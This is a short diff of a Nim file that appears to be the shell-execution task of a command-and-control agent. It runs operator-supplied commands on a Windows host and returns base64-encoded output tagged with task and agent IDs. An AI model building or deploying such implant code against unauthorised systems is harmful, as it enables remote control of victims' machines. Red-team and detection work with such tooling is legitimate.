@@ -1,14 +1,24 @@
-import winim, osproc, strutils, strformat
+import winim, osproc, strutils, strformat, base64
 
 import ../types
 
-proc taskShell*(command: seq[string]): tuple[output: TaskResult, status: TaskStatus] = 
+proc taskShell*(task: Task): TaskResult = 
 
-    echo "Executing command: ", command.join(" ")
+    echo "Executing command: ", task.args.join(" ")
 
     try: 
-        let (output, status) = execCmdEx(command.join(" ")) 
-        return (output, Completed) 
+        let (output, status) = execCmdEx(task.args.join(" ")) 
+        return TaskResult(
+            task: task.id, 
+            agent: task.agent, 
+            data: encode(output),
+            status: Completed 
+        )
 
     except CatchableError as err: 
-        return (fmt"An error occured: {err.msg}" & "\n", Failed) 
+        return TaskResult(
+            task: task.id, 
+            agent: task.agent, 
+            data: encode(fmt"An error occured: {err.msg}" & "\n"),
+            status: Failed 
+        )
